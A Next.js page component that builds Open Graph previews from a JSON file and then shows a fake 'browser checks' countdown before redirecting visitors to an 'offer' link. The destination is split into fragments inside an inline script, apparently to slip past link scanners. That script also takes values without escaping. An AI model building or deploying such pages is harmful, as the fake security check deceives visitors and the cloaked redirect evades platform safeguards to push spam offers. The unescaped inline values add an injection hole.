import fs from "fs";
import path from "path";
import { GetServerSideProps } from "next";
import Head from "next/head";

interface DataItem {
  id: string;
  title: string;
  img: string;
  linkoffer: string;
}

export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async (context) => {
  const { id } = context.params!;

  // Ambil data dari JSON
  const filePath = path.join(process.cwd(), "public", "data.json");
  const jsonData = fs.readFileSync(filePath, "utf-8");
  const data: DataItem[] = JSON.parse(jsonData);

  // Cari data berdasarkan ID
  const item = data.find((x) => x.id === id);

  // Kalau tidak ditemukan → redirect ke 404
  if (!item) {
    return { notFound: true };
  }

  return { props: { item } };
};

export default function RedirectPage({ item }: { item: DataItem }) {
  // Pisahkan linkoffer jadi bagian-bagian agar seperti contoh kamu
  const url = new URL(item.linkoffer);
  const domain = url.hostname.replace("www.", "");
  const pathPart = url.pathname;
  const key = url.searchParams.get("key") || "";

  return (
    <>
      <Head>
        <title>{item.title}</title>
        <meta property="og:title" content={item.title} />
        <meta property="og:image" content={item.img} />
        <meta property="og:type" content="website" />
        <meta property="og:url" content={`https://${domain}${pathPart}?key=${key}`} />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div style={styles.container}>
        <div className="content">
          <h1>Please wait one moment!</h1>
          <h2 id="number">3</h2>
          <p>We need to carry out some browser checks, please wait 3 seconds..</p>
          <p>Thank you for your patience!</p>
        </div>

        <footer>
          <input type="hidden" id="loc" value={key} />
        </footer>

        <script
          dangerouslySetInnerHTML={{
            __html: `
              setInterval(function(){ 
                var number = document.getElementById("number").innerHTML;
                var url1 = '${domain.split(".")[0]}';
                var url2 = '.${domain.split(".").slice(1).join(".")}';
                var url3 = '${pathPart}';
                if (number > 0) {
                  number--;
                }
                document.getElementById("number").innerHTML = number; 
                if (number == 0) {
                  window.location.replace('https://' + url1 + url2 + url3 + '?key=${key}');
                }
              }, 1000);
            `,
          }}
        />
      </div>
    </>
  );
}

const styles = {
  container: {
    textAlign: "center" as const,
    display: "flex",
    flexDirection: "column" as const,
    justifyContent: "center",
    minHeight: "100vh",
    fontFamily: "'Poppins', sans-serif",
    background: "#fff",
    color: "#000",
  },
};
